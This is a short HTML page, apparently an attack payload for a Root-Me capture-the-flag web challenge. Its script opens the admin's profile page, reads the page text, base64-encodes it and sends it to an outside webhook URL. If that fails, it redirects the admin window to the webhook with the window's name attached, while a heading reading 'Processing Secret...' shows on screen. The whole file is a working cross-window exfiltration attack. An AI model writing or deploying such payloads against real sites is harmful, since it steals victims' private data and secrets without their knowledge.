<!DOCTYPE html>
<html>
<body>
    <script>
        // 1. Open the admin's profile
        const adminWindow = window.open('http://challenge01.root-me.org:58003/profile');

        // 2. Wait for it to load, then grab the content
        // Note: This only works if there isn't a strict Cross-Origin-Opener-Policy
        setTimeout(() => {
            try {
                // Try to grab the secret directly from the admin's window
                const secret = adminWindow.document.body.innerText;
                fetch('https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?data=' + btoa(secret));
            } catch (e) {
                // If direct access is blocked, we use the "opener" back-channel
                // by redirecting the admin's window to your webhook
                adminWindow.location = 'https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?data=' + btoa(adminWindow.name);
            }
        }, 2000);
    </script>
    <h1>Processing Secret...</h1>
</body>
</html>
